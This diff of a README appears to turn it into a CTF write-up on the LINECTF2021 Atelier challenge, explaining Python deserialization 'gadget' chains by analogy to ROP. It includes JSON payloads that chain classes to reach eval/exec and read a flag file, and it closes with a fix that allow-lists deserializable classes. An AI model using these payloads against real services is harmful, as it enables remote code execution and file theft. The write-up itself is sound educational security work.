@@ -1,20 +1,8 @@
-# python-gadgets
+# LINECTF2021 Atelier: python-gadgets
 
-Diving into the Atelier challenge of LINECTF2021 using Python gadgets (similar to ROP gadgets)
+Recently I did the LINECTF2021, which had the pwn challenge Atelier. During the challenge I had an idea where to go with the exploit, but didn't manage to find it during the CTF. After the CTF I looked at two write-ups and played around with them. How these exploits worked were really interesting to me as a Python developer and thus I write this post about it. First I'll give some background information about another exploit type, ROP chains. This at first doesn't seem that relevant, since the challenge was written in Python and not in C, but later on it becomes clear that the exploit for this challenge uses really similar mechanics.
 
-## Setup
-
-```bash
-python3 -m venv venv
-. venv/bin/activate
-pip3 install -r requirements.txt
-
-python3 server.py
-python3 exploit1.py 0.0.0.0 8081
-python3 exploit2.py 0.0.0.0 8081
-```
-
-## ROP chain exploit in binaries
+## ROP chain exploit in C binaries
 
 In C binaries a way to create exploits in binary is abusing Return Oriented Programming (ROP). When in a C binary a function is called, a new area on top of the stack is allocated dedicated for this function. This area contains all the instructions of this function with at the end an address which points to place from where the function is called. This means when the function is finished, the address at the end allows the program to return to place it was before which could be another function. This can be abused by overwritting this return address with an address to another place in memory, allowing the program to execute in a different way than expected. Often the overridden address points to a libc function, which is the basic library used in binaries containing a lot of common functions used, for example methods for: string manipulation, file I/O, mathematics and [many more](https://www.gnu.org/software/libc/manual/html_mono/libc.html). In exploits often the way to go is using the [execve](https://man7.org/linux/man-pages/man2/execve.2.html) method with `/bin/sh` as an argument, allowing the user to escape the program and to execute shell commands on the machine.
 
@@ -26,11 +14,11 @@ Although Python also follows the principle of return oriented programming, it's 
 
 # The challenge: Atelier
 
-The challenge gives us just a Python script which we can run against an external server. When we run it it looks as follows:
+The challenge gives us just a Python script which can be run against an external server. When running it it looks as follows:
 
 ![Atelier](resources/atelier.png)
 
-As can be seen the program is relatively simple: we can choose two materials and a result is shown. I tried different inputs, like non existing numbers or special characters, but the server seemed to handle this correctly. So let's dive into the code of the client we received.
+As can be seen the program is relatively simple: choose two materials and a result is shown. I tried different inputs, like non existing numbers or special characters, but the server seemed to handle this correctly. So let's dive into the code of the provided client.
 
 ```python
 #!/usr/bin/env python3
@@ -143,7 +131,7 @@ print("\nResult :\n" + res.result)
 loop.close()
 ```
 
-The code is also not that difficult to read. The client creates an object of a class defined in the script (either `MaterialRequest` or `RecipeCreateRequest`), serializes this to a JSON string using the `object_to_dict` method and sends it to the server using a stream. The client than waits for a response of the server, which is deserializes from a JSON string using the `dict_to_object` method to a object of a class also defined in the script (either `MaterialRequestReply` or `RecipeCreateReply`). The serializing of the object results in the following message we send to the server:
+The code is also not that difficult to read. The client creates an object of a class defined in the script (either `MaterialRequest` or `RecipeCreateRequest`), serializes this to a JSON string using the `object_to_dict` method and sends it to the server using a stream. The client than waits for a response of the server, which is deserializes from a JSON string using the `dict_to_object` method to a object of a class also defined in the script (either `MaterialRequestReply` or `RecipeCreateReply`). The serializing of the object results in the following message send to the server:
 
 ```json
 {
@@ -153,7 +141,7 @@ The code is also not that difficult to read. The client creates an object of a c
 }
 ```
 
-Although the client enforces us in the structure of the message we sent, we can modify the client to send whatever message we want. I also found out that the server doesn't keep a state, it just processes the request based on the structure. I confirmed this by setting a new connection and send the above message without a `MaterialRequest` first.
+Although the client enforces us in the structure of the message sent, the client can be modified to send whatever message wanted. I also found out that the server doesn't keep a state, it just processes the request based on the structure. I confirmed this by setting a new connection and send the above message without a `MaterialRequest` first.
 
 Two things in this client were interesting to me. The first was the import of sqlalchemy which was commented out. It could be a hint that sqlalchemy is used, possibly by the server. The second thing that catched my eye was the way the serializing and deserializing was done. Instead of processing just a dict with data, this client processes objects of an user defined class. From other challenges I remember that in JavaScript [prototype poluttion](https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications) exists. Here extra, unexpected properties are added to the serialized to the sent message. When the server deserializes this message, the properties can override methods of the deserialized object, resulting in unexpected and unwanted behavior. For example the following code 'polutes' the `toString` property:
 
@@ -169,7 +157,7 @@ console.log(customer.toString());
 // alert box pops up: "polluted"
 ```
 
-Since the Python client deserializes the message into an object of a class, we could also override builtin methods of the object. I tried this during the CTF, but I didn't find a way to accomplish this during the CTF. So I waited for the CTF to end and read the write-ups, which proved I was on the right path, but the way the exploit works really blew my mind.
+Since the Python client deserializes the message into an object of a class, the methods of the object could also be overridden. I tried this during the CTF, but I didn't find a way to accomplish this during the CTF. So I waited for the CTF to end and read the write-ups, which proved I was on the right path, but the way the exploit works really blew my mind.
 
 ## The exploits
 
@@ -475,7 +463,7 @@ The way the server works is very similar to the client, it also serializes objec
 
 ## Exploits explained
 
-Let's dive into the first exploit using the classes `_FunctionGenerator` and `_class_resolver` to see exactly what is happening. Since we have the code of the server, we can debug it and see how it handles the message of the exploit. We can see that the deserialized message results in the following Python object:
+Let's dive into the first exploit using the classes `_FunctionGenerator` and `_class_resolver` to see exactly what is happening. Since the code of the server is available, it can be debugged and seen how it handles the message of the exploit. The deserialized message results in the following Python object:
 
 ![Debug 1](resources/debug1.png)
 
@@ -487,7 +475,7 @@ The exploits seem to override the split method and hovering over the value of it
 
 ![Debug 3](resources/debug3.png)
 
-By disabling the `justMyCode` setting of VS Code we can follow this call:
+By disabling the `justMyCode` setting of VS Code, this call can be followed:
 
 ![Debug 4](resources/debug4.png)
 
@@ -507,4 +495,146 @@ Okay so we can reference classes which have implemented the `__call__`. Let's se
 
 ![Debug 5](resources/debug5.png)
 
-So as expected, the `copy` method now points to the
+So as expected, the `copy` method now points to the `_class_resolver` class and if this class has a `__call__` method, the code will go there:
+
+![Debug 6](resources/debug6.png)
+
+So this is also as expected. On top of that we can see that the arguments `arg` and `_dict` are also set. If the code continious, the `eval` statement is executed, which returns an exception where the message of the exception contains the flag. Since `eval` raises an exception which is not caught, it will be thrown untill this it's catched. The `__call__` methods of the `_class_resolver` and `_FunctionGenerator` don't catch this exception, but the server script does:
+
+![Debug 7](resources/debug7.png)
+
+The error message, in this case the flag, is returned via an `AtelierException` to the user. With this the circle is round, but the question still remains why all these extra jumps and nested classes were necessary; couldn't we just use call the `_class_resolver` straight away?
+
+This is were the story is very similar to ROP chains in C binaries. For a ROP chain we had to chain ROP gadgets to set the registries to the right values to call our exploit method. In this case it's also necessary to set the parameters to the right values for us to be able to call the exploit method in class `_class_resolver`. The `split` method has as parameter the input `","`, but the `__call__` method of the `_class_resolver` doesn't take any arguments (`self` is always an argument, so we can ignore it). So the following happens if we let `split` point to `_class_resolver` we get the exception: `Exception: TypeError('__call__() takes 1 positional argument but 2 were given',)`. The `__call__` method of the class `_FunctionGenerator` takes an argument `*c` (and `**kwargs` but these are optional). Also the first call it does is a method without any arguments, which is the structure we need. So the `_FunctionGenerator` class is used as a gadget to lose an argument.
+
+## Python gadgets
+
+Both exploits searched for a way to read a file and return the result to the client. To do this `eval` can be used, which in the case of sqllibrary was available in the `__call__` method of the `_class_resolver`. For other libraries the `eval` method might be in other places or other methods could be abused to create unintended behavior. Since we can't change the structure of this method, the number and type of the parameters, it's necessary to use gadgets to set the parameters in the right way.
+
+To understand how these Python gadgets exactly work, I created a simplified situation. Which is very similar to the Atelier, but translates a text to upper case:
+
+```python
+async def handle_client(client, loop):
+    try:
+        dat = await loop.sock_recv(client, 2000)
+        obj = json.loads(dat, object_hook=dict_to_object)
+
+        if isinstance(obj, UpperRequest):
+            text = obj.text.upper()
+            response = UpperReply(text)
+        else:
+            response = UpperException("unknown message")
+
+    except Exception as e:
+        response = UpperException(e)
+        print(e)
+
+    response = json.dumps(response, default=object_to_dict).encode("ascii")
+    await loop.sock_sendall(client, response)
+    client.shutdown(socket.SHUT_RDWR)
+```
+
+It also has the following 'random' class available in the `helpers` module:
+
+```python
+class EvalClass:
+    def __init__(self, e):
+        self.message = repr(e)
+
+    def __call__(self, a_dict):
+        return eval(self.arg, globals(), a_dict)
+```
+
+Here the `__call__` method looks similar to the Atelier example, but in this case it takes an argument, while the `upper` method doesn't provide any arguments. So we will need a Python gadget which takes no arguments, but passes on an (empty) dictionary as an argument. Such a class looks as follows:
+
+```python
+class RandomClass:
+    def __call__(self, an_argument):
+        return self.a_method({})
+```
+
+Where the payload would look like:
+
+```json
+{
+  "__class__": "UpperRequest",
+  "__module__": "__main__",
+  "text": {
+    "__class__": "UpperRequest",
+    "__module__": "__main__",
+    "upper": {
+      "__class__": "RandomClass1",
+      "__module__": "helpers",
+      "a_method": {
+        "__class__": "EvalClass",
+        "__module__": "helpers",
+        "arg": "exec(\"raise Exception(open('flag').read())\")"
+      }
+    }
+  }
+}
+```
+
+This payload results in reading the flag file and returning it to the client. One interesting detail which hasn't been clarified in the exploits yet was the need for an extra object of class `UpperRequest`. Since the method `upper` is called on the property `text`, but not on the object of class `UpperRequest` directly, this property should also be initialized as something. Since `UpperRequest` is a known class without any side-effects, like a custom constructor, the type of the `text` property can be set to this class. This will result in the following when debugging the server:
+
+![Debug 8](resources/debug8.png)
+
+This is also important when looking for Python gadgets. Since an exception is thrown in the `eval` method, the code happening after the call made in the gadget (in the exploit the code after the `self.opts.copy()` call), is never called. But as can be seen with that example, not the object itself is directly called, but a property of the object. So a class could also look like:
+
+```python
+class RandomClass2:
+    def __call__(self):
+        return self.a_property.a_property.a_property.a_method({})
+```
+
+Here the payload should look as follows:
+
+```json
+{
+  "__class__": "UpperRequest",
+  "__module__": "__main__",
+  "text": {
+    "__class__": "UpperRequest",
+    "__module__": "__main__",
+    "upper": {
+      "__class__": "RandomClass2",
+      "__module__": "helpers",
+      "a_property": {
+        "__class__": "RandomClass2",
+        "__module__": "helpers",
+        "a_property": {
+          "__class__": "RandomClass2",
+          "__module__": "helpers",
+          "a_property": {
+            "__class__": "UpperRequest",
+            "__module__": "__main__",
+            "a_method": {
+              "__class__": "EvalClass",
+              "__module__": "helpers",
+              "arg": "exec(\"raise Exception(open('flag').read())\")"
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+Of course chaining of methods could also be possible, but I think the idea is clear now. If the size of the library increases, the available Python gadgets also increases. With it the possible ways to write a chain resulting in an exploit also increases.
+
+## Closing notes
+
+This challenge learned me a lot about the builtin methods of Python (in this case `__call__`) and how a harmless looking program actually can be exploited in an interesting way. This way of (de)serializing JSON data to/from objects of classes isn't used that often, but if used the best fix would be to limit the classes to which can be deserialized. In the `dict_to_object` method of the server the following code could be changed:
+
+```python
+if (module_name not in ["__main__"]) and (
+    not module_name.startswith("sqlalchemy")
+):
+    # no unintended solutions plz
+    raise ModuleNotFoundError(f"No module named {module_name}")
+```
+
+Here the classes from the `sqlalchemy` modules are explicitly allowed, which of course made the exploit possible. The fix would be to limit the module and class deserialization options to only allowed values.
+
+Although I didn't solve this challenge during the CTF, I still thought it was very useful. By trying to think about it during the CTF and trying the solutions from the write-ups afterwards, I learned something new about Python. This, I think, is one of the main reasons for me to play these CTF challenges.
